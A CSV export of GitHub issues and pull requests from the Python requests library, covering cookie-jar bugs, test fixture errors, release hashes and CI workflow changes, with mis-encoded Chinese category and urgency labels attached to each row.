id,title,body,category,urgency,html_url
3341146794,recursive dependency involving fixture 'httpbin' detected when running tests,"`recursive dependency involving fixture 'httpbin' detected` when running tests

## Expected Result

tests run or provide actionable error report

## Actual Result

Large part of tests failing to run because of 'recursive dependency'

## Reproduction Steps

`make ci`

```
______________________________________________________________________________________ ERROR at setup of test_content_length_for_string_data_counts_bytes _______________________________________________________________________________________
file /home/hramrach/requests/tests/test_requests.py, line 3032
  @pytest.mark.skipif(
      is_urllib3_1,
      reason=""urllib3 2.x encodes all strings to utf-8, urllib3 1.x uses latin-1"",
  )
  def test_content_length_for_string_data_counts_bytes(httpbin):
file /home/hramrach/requests/tests/conftest.py, line 25
  @pytest.fixture
  def httpbin(httpbin):
E       recursive dependency involving fixture 'httpbin' detected
>       available fixtures: anyio_backend, anyio_backend_name, anyio_backend_options, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, doctest_namespace, httpbin, httpbin_secure, monkeypatch, nosan_server, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.
```

Probably `httpbin` is missing and because of the way httpbin is used in the test code this cryptic message is produced.

## System Information

    $ python3 -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": ""44.0.3""
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.5""
  },
  ""platform"": {
    ""release"": ""6.12.0-160000.19-rt"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30500000"",
    ""version"": ""25.0.0""
  },
  ""requests"": {
    ""version"": ""2.32.4""
  },
  ""system_ssl"": {
    ""version"": ""30500000""
  },
  ""urllib3"": {
    ""version"": ""2.5.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": true
}
```

","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/7016
3340976977,Use EmailMessage for response headers,"MockResponse requires EmailMessage for http.CookieJar to be able to
extract cookies from headers but CaseInsensitiveDict is provided.

Use EmailMessage and special-case Set-Cookie per note in
https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.2

Fixes: #7014
","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/7015
3339239966,Cannot use LWPCookiejar with requests,"There is no way to put cookies into a standard cookiejar.

## Expected Result

Cookies can be stored in LWP format

## Actual Result

Cookies are provided in multiple unusable formats, no way to store to a standard jar.

## Reproduction Steps

Make a request that returns multiple cookies. (This is not verified, I do not know how to access _actual headers_ from a `Response` object.)

```
        r = requests.request(method, self.url + path, *args, **kwargs)
        if hasattr(self, 'cookiejar'):
            if 'Set-Cookie' in r.headers or 'Set-Cookie2' in r.headers:
                def get_all(self, name, default=[]):
                    return [self.get(name, default)]  # it's a dictionary, can only have one match anyway
                if not hasattr(r.headers, 'get_all'):
                    r.headers.get_all = types.MethodType(get_all, r.headers)

                self.cookiejar.extract_cookies(requests.cookies.MockResponse(r.headers),
                                               requests.cookies.MockRequest(r.request))
```

`Response` has a `cookies` property but this returns a custom cookie jar which cannot be saved in **LWP** format.

The standard `LWPCookieJar` provides interface for iterating cookies but not storing cookies, only for extracting cookies from headers.

The `Response` object has a `headers` property but this is a **dictionary**, and cannot store _multiple headers_ of the same name correctly. There is nothing stopping the server from sending _multiple_ `Set-Cookie` headers, the standard only requests that no two cookies with the same name be sent. When it does the `Response` `headers` property has a mangled `Set-Cookie` header, and it cannot be parsed by `LWPCookieJar`. `Response` does not provide access to _unmangled headers_ in any way I can find in the documentation.

## System Information

Linux, python 3.6~3.11

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.1.0""
  },
  ""cryptography"": {
    ""version"": ""41.0.3""
  },
  ""idna"": {
    ""version"": ""3.4""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.13""
  },
  ""platform"": {
    ""release"": ""6.4.0-150600.23.47-default"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30100040"",
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.31.0""
  },
  ""system_ssl"": {
    ""version"": ""30100040""
  },
  ""urllib3"": {
    ""version"": ""2.0.7""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```
","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/7014
3332878377,v2.32.5 wheel file hash doesn't match between PyPI and CI,"Looking at the hashes of the [wheel in PyPI](https://pypi.org/project/requests/#requests-2.32.5-py3-none-any.whl) (and [in the GitHub release](https://github.com/psf/requests/releases/tag/v2.32.5)) and the hash of the uploaded build artefact from [the v2.32.5 publish workflow run](https://github.com/psf/requests/actions/runs/17051830790), they differ:

* PyPI: 2462f94637a34fd532264295e186976db0f5d453d1cdd31473c85a6a161affb6
* GitHub CI: 0f39b052d7ba3d55645a49019311390fc576ea7c2a594f56eb9b67a5388a6e84

I would guess that this is because when the `publish` CI job failed, the distributions were build locally and uploaded manually. In the future, I suggest fetching the build distributions from GitHub CI build artefacts, and publishing those.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/7013
3328472280,Migrate build system to hatchling,"This PR follows up on the original [announcement ](https://github.com/psf/requests/releases/tag/v2.32.0) of migrating Requests to be PEP517 compliant backend in 2.33.0. This PR proposes moving to hatchling which has wide adoption, but there's an argument for staying on setuptools. I'd be curious to hear from other maintainers on if there's a strong preference in either direction based on other projects.

@pquentin or @sethmlarson may have input from migrating urllib3 as well. Presumably users with urllib3 2.x are already capable of building with this setup in their environment.","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/7012
3328456146,v2.32.5,"2.32.5 (2025-08-18)
-------------------

**Bugfixes**

- The SSLContext caching feature originally introduced in 2.32.0 has created
  a new class of issues in Requests that have had negative impact across a number
  of use cases. The Requests team has decided to revert this feature as long term
  maintenance of it is proving to be unsustainable in its current iteration.

**Deprecations**
- Added support for Python 3.14.
- Dropped support for Python 3.8 following its end of support.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/7011
3311815890,Bump actions/checkout from 4.2.0 to 5.0.0,"Bumps [actions/checkout](https://github.com/actions/checkout) from 4.2.0 to 5.0.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/releases"">actions/checkout's releases</a>.</em></p>
<blockquote>
<h2>v5.0.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Update actions checkout to use node 24 by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2226"">actions/checkout#2226</a></li>
<li>Prepare v5.0.0 release by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2238"">actions/checkout#2238</a></li>
</ul>
<h2>âš ï¸ Minimum Compatible Runner Version</h2>
<p><strong>v2.327.1</strong><br />
<a href=""https://github.com/actions/runner/releases/tag/v2.327.1"">Release Notes</a></p>
<p>Make sure your runner is updated to this version or newer to use this release.</p>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4...v5.0.0"">https://github.com/actions/checkout/compare/v4...v5.0.0</a></p>
<h2>v4.3.0</h2>
<h2>What's Changed</h2>
<ul>
<li>docs: update README.md by <a href=""https://github.com/motss""><code>@â€‹motss</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li>Add internal repos for checking out multiple repositories by <a href=""https://github.com/mouismail""><code>@â€‹mouismail</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li>Documentation update - add recommended permissions to Readme by <a href=""https://github.com/benwells""><code>@â€‹benwells</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li>Adjust positioning of user email note and permissions heading by <a href=""https://github.com/joshmgross""><code>@â€‹joshmgross</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2044"">actions/checkout#2044</a></li>
<li>Update README.md by <a href=""https://github.com/nebuk89""><code>@â€‹nebuk89</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li>Update CODEOWNERS for actions by <a href=""https://github.com/TingluoHuang""><code>@â€‹TingluoHuang</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2224"">actions/checkout#2224</a></li>
<li>Update package dependencies by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
<li>Prepare release v4.3.0 by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2237"">actions/checkout#2237</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/motss""><code>@â€‹motss</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li><a href=""https://github.com/mouismail""><code>@â€‹mouismail</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li><a href=""https://github.com/benwells""><code>@â€‹benwells</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li><a href=""https://github.com/nebuk89""><code>@â€‹nebuk89</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li><a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4...v4.3.0"">https://github.com/actions/checkout/compare/v4...v4.3.0</a></p>
<h2>v4.2.2</h2>
<h2>What's Changed</h2>
<ul>
<li><code>url-helper.ts</code> now leverages well-known environment variables by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1941"">actions/checkout#1941</a></li>
<li>Expand unit test coverage for <code>isGhes</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1946"">actions/checkout#1946</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.2.1...v4.2.2"">https://github.com/actions/checkout/compare/v4.2.1...v4.2.2</a></p>
<h2>v4.2.1</h2>
<h2>What's Changed</h2>
<ul>
<li>Check out other refs/* by commit if provided, fall back to ref by <a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1924"">actions/checkout#1924</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/Jcambass""><code>@â€‹Jcambass</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/checkout/pull/1919"">actions/checkout#1919</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/checkout/compare/v4.2.0...v4.2.1"">https://github.com/actions/checkout/compare/v4.2.0...v4.2.1</a></p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/actions/checkout/blob/main/CHANGELOG.md"">actions/checkout's changelog</a>.</em></p>
<blockquote>
<h1>Changelog</h1>
<h2>V5.0.0</h2>
<ul>
<li>Update actions checkout to use node 24 by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2226"">actions/checkout#2226</a></li>
</ul>
<h2>V4.3.0</h2>
<ul>
<li>docs: update README.md by <a href=""https://github.com/motss""><code>@â€‹motss</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1971"">actions/checkout#1971</a></li>
<li>Add internal repos for checking out multiple repositories by <a href=""https://github.com/mouismail""><code>@â€‹mouismail</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1977"">actions/checkout#1977</a></li>
<li>Documentation update - add recommended permissions to Readme by <a href=""https://github.com/benwells""><code>@â€‹benwells</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2043"">actions/checkout#2043</a></li>
<li>Adjust positioning of user email note and permissions heading by <a href=""https://github.com/joshmgross""><code>@â€‹joshmgross</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2044"">actions/checkout#2044</a></li>
<li>Update README.md by <a href=""https://github.com/nebuk89""><code>@â€‹nebuk89</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2194"">actions/checkout#2194</a></li>
<li>Update CODEOWNERS for actions by <a href=""https://github.com/TingluoHuang""><code>@â€‹TingluoHuang</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2224"">actions/checkout#2224</a></li>
<li>Update package dependencies by <a href=""https://github.com/salmanmkc""><code>@â€‹salmanmkc</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/2236"">actions/checkout#2236</a></li>
</ul>
<h2>v4.2.2</h2>
<ul>
<li><code>url-helper.ts</code> now leverages well-known environment variables by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1941"">actions/checkout#1941</a></li>
<li>Expand unit test coverage for <code>isGhes</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1946"">actions/checkout#1946</a></li>
</ul>
<h2>v4.2.1</h2>
<ul>
<li>Check out other refs/* by commit if provided, fall back to ref by <a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1924"">actions/checkout#1924</a></li>
</ul>
<h2>v4.2.0</h2>
<ul>
<li>Add Ref and Commit outputs by <a href=""https://github.com/lucacome""><code>@â€‹lucacome</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1180"">actions/checkout#1180</a></li>
<li>Dependency updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a>- <a href=""https://redirect.github.com/actions/checkout/pull/1777"">actions/checkout#1777</a>, <a href=""https://redirect.github.com/actions/checkout/pull/1872"">actions/checkout#1872</a></li>
</ul>
<h2>v4.1.7</h2>
<ul>
<li>Bump the minor-npm-dependencies group across 1 directory with 4 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1739"">actions/checkout#1739</a></li>
<li>Bump actions/checkout from 3 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1697"">actions/checkout#1697</a></li>
<li>Check out other refs/* by commit by <a href=""https://github.com/orhantoy""><code>@â€‹orhantoy</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1774"">actions/checkout#1774</a></li>
<li>Pin actions/checkout's own workflows to a known, good, stable version. by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1776"">actions/checkout#1776</a></li>
</ul>
<h2>v4.1.6</h2>
<ul>
<li>Check platform to set archive extension appropriately by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1732"">actions/checkout#1732</a></li>
</ul>
<h2>v4.1.5</h2>
<ul>
<li>Update NPM dependencies by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1703"">actions/checkout#1703</a></li>
<li>Bump github/codeql-action from 2 to 3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1694"">actions/checkout#1694</a></li>
<li>Bump actions/setup-node from 1 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1696"">actions/checkout#1696</a></li>
<li>Bump actions/upload-artifact from 2 to 4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1695"">actions/checkout#1695</a></li>
<li>README: Suggest <code>user.email</code> to be <code>41898282+github-actions[bot]@users.noreply.github.com</code> by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1707"">actions/checkout#1707</a></li>
</ul>
<h2>v4.1.4</h2>
<ul>
<li>Disable <code>extensions.worktreeConfig</code> when disabling <code>sparse-checkout</code> by <a href=""https://github.com/jww3""><code>@â€‹jww3</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1692"">actions/checkout#1692</a></li>
<li>Add dependabot config by <a href=""https://github.com/cory-miller""><code>@â€‹cory-miller</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1688"">actions/checkout#1688</a></li>
<li>Bump the minor-actions-dependencies group with 2 updates by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1693"">actions/checkout#1693</a></li>
<li>Bump word-wrap from 1.2.3 to 1.2.5 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/checkout/pull/1643"">actions/checkout#1643</a></li>
</ul>
<h2>v4.1.3</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/checkout/commit/08c6903cd8c0fde910a37f88322edcfb5dd907a8""><code>08c6903</code></a> Prepare v5.0.0 release (<a href=""https://redirect.github.com/actions/checkout/issues/2238"">#2238</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/9f265659d3bb64ab1440b03b12f4d47a24320917""><code>9f26565</code></a> Update actions checkout to use node 24 (<a href=""https://redirect.github.com/actions/checkout/issues/2226"">#2226</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/08eba0b27e820071cde6df949e0beb9ba4906955""><code>08eba0b</code></a> Prepare release v4.3.0 (<a href=""https://redirect.github.com/actions/checkout/issues/2237"">#2237</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/631c7dc4f80f88219c5ee78fee08c6b62fac8da1""><code>631c7dc</code></a> Update package dependencies (<a href=""https://redirect.github.com/actions/checkout/issues/2236"">#2236</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/8edcb1bdb4e267140fa742c62e395cd74f332709""><code>8edcb1b</code></a> Update CODEOWNERS for actions (<a href=""https://redirect.github.com/actions/checkout/issues/2224"">#2224</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/09d2acae674a48949e3602304ab46fd20ae0c42f""><code>09d2aca</code></a> Update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/2194"">#2194</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/85e6279cec87321a52edac9c87bce653a07cf6c2""><code>85e6279</code></a> Adjust positioning of user email note and permissions heading (<a href=""https://redirect.github.com/actions/checkout/issues/2044"">#2044</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/009b9ae9e446ad8d9b8c809870b0fbcc5e03573e""><code>009b9ae</code></a> Documentation update - add recommended permissions to Readme (<a href=""https://redirect.github.com/actions/checkout/issues/2043"">#2043</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/cbb722410c2e876e24abbe8de2cc27693e501dcb""><code>cbb7224</code></a> Update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/1977"">#1977</a>)</li>
<li><a href=""https://github.com/actions/checkout/commit/3b9b8c884f6b4bb4d5be2779c26374abadae0871""><code>3b9b8c8</code></a> docs: update README.md (<a href=""https://redirect.github.com/actions/checkout/issues/1971"">#1971</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/actions/checkout/compare/v4.2.0...08c6903cd8c0fde910a37f88322edcfb5dd907a8"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/checkout&package-manager=github_actions&previous-version=4.2.0&new-version=5.0.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/pull/7010
3307532080,Add test for RequestsCookieJar zero and empty string value handling,"This pull request adds a test that verifies RequestsCookieJar correctly handles cookies with zero and empty string values.
I noticed there are already fixes related to this issue (#7003), but no corresponding test was included.
Therefore, this PR adds the missing test to ensure no regressions happen in the future.

No changes to production code are included, only the test to improve coverage.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/7009
3305146816,fix: allow empty string and zero values to be retrieved from RequestsCookieJar,"### Summary
Fixes an issue (#7003) where cookies with an empty string ('') or zero (0) value were treated as missing.

### Changes
- Updated _find_no_duplicates to check `is not None` instead of truthiness.
- Added unit test to verify behavior.

Fixes #7003 ","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/7008
3295700664,Make the SSL version more human-readable,"When executing `python -m requests.help`, the previous format looked like:
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": ""40.0.2""
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""30100000"",
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""100020bf""
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}
```

The current format looks like:
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": ""40.0.2""
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": ""OpenSSL 3.1.0 14 Mar 2023"", 
    ""version"": ""23.2.0""
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""OpenSSL 1.0.2k-fips  26 Jan 2017"" 
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": true
}

```",åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/7007
3295353684,ModuleNotFoundError,"  File ""/usr/lib/python3.13/site-packages/requests/__init__.py"", line 43, in <module>
    import urllib3
  File ""/usr/lib/python3.13/site-packages/urllib3/__init__.py"", line 14, in <module>
    from . import exceptions
  File ""/usr/lib/python3.13/site-packages/urllib3/exceptions.py"", line 7, in <module>
    from http.client import IncompleteRead as httplib_IncompleteRead
ModuleNotFoundError: No module named 'http.client'; 'http' is not a package","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/7006
3295285881,security: update publish workflow to use `artifact-id` instead of `name`,"## Use `artifact-id` instead of `name` with Actions Artifacts ğŸ”’ 

This pull updates the **publish** workflow to use `artifact-id` instead of `name` when downloading artifacts that have been previously published in prior workflow steps. This is important because artifacts produced by GitHub Actions can be completely overwritten by other workflow runs if they use the same `name` under very unique circumstances (like passing the `run-id` value to the download-artifact action to point to an entirely different workflow run - don't do that). To avoid potential TOCTOU issues/vulnerabilities where an artifact might be replaced between upload and download, the new `artifact-ids` input allows you to download artifacts by their specific ID rather than by name. This is safer but also helps lead to more deterministic workflow builds by referencing the artifact you wish to download by its _exact id_.

This PR also hardens the workflow a bit by adding `persist-credentials: false` to the checkout step.

---

I recently did some work to land these exact changes in the [urllib3/urllib3](https://github.com/urllib3/urllib3/pulls?q=is%3Apr+is%3Aclosed+author%3AGrantBirki) and wanted to contribute those same changes here as well!","Bugåé¦ˆ, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/7005
3292227381,Fix-#7003: RequestsCookieJar cannot correctly retrieve zero value,"When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.  (Fix #7003)","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/7004
3292148459,"When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.","When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.

## Expected Result

It can be retrieved properly after being set.

## Actual Result

It cannot be retrieved properly after being set.

## Reproduction Steps

```python
from requests.cookies import RequestsCookieJar

jar = RequestsCookieJar()

jar.set('token', 0, domain='example.com', path='/')

print(""Jar contents:"", list(jar.items()))  # [('token', 0)]
print(""jar.get:"", jar.get('token', domain='example.com', path='/'))  # it should return 0 instead of None.

try:
    print(""jar['token']:"", jar['token'])  # it should return 0 instead of raising an error.
except KeyError as e:
    print(""KeyError raised unexpectedly:"", e)

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""100020bf""
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/7003
3286622470,Teat,,å…¶ä»–,ä¸­,https://github.com/psf/requests/issues/7002
3280460825,Dynamic import causing FileNotFoundError in shrinkwrapped applications after deployment of new versioon,"https://github.com/psf/requests/blob/970e8cec988421bd43da57350723b05c8ce8dc7e/src/requests/utils.py#L214

The dynamic import in the referenced code above is causing errors with shrinkwrapped scripts whenever we try to replace an old version with a new one while an old script is running because the old script execution tries to access a python path that has been replaced by the new version of the script. See the sequence of events below:

1. script.v1.0 running
2. script.v2.0  is deployed to replacev1.0
3. running script.v.1.0 makes a POST request and fails at the dynamic upload with FileNotFoundError","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/7001
3275325151,Fix stringio content length,"fix(utils): correct Content-Length for io.StringIO bodies (#6917)

- Add special handling for io.StringIO in super_len() function
- Calculate byte length by encoding StringIO content as UTF-8
- Preserve stream position to avoid surprising users
- Fixes incorrect Content-Length header when StringIO contains multi-byte UTF-8 characters
- Test multi-byte UTF-8 characters (ğŸ’©, ğŸš€, ğŸ‰)
- Test position preservation after super_len call
- Test partial read scenarios
- Test PreparedRequest Content-Length header
- Test consistency with str and bytes behavior
- All tests verify correct byte-length calculation""","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/7000
3271028383,Bump step-security/harden-runner from 2.12.0 to 2.13.0,"Bumps [step-security/harden-runner](https://github.com/step-security/harden-runner) from 2.12.0 to 2.13.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/step-security/harden-runner/releases"">step-security/harden-runner's releases</a>.</em></p>
<blockquote>
<h2>v2.13.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Improved job markdown summary</li>
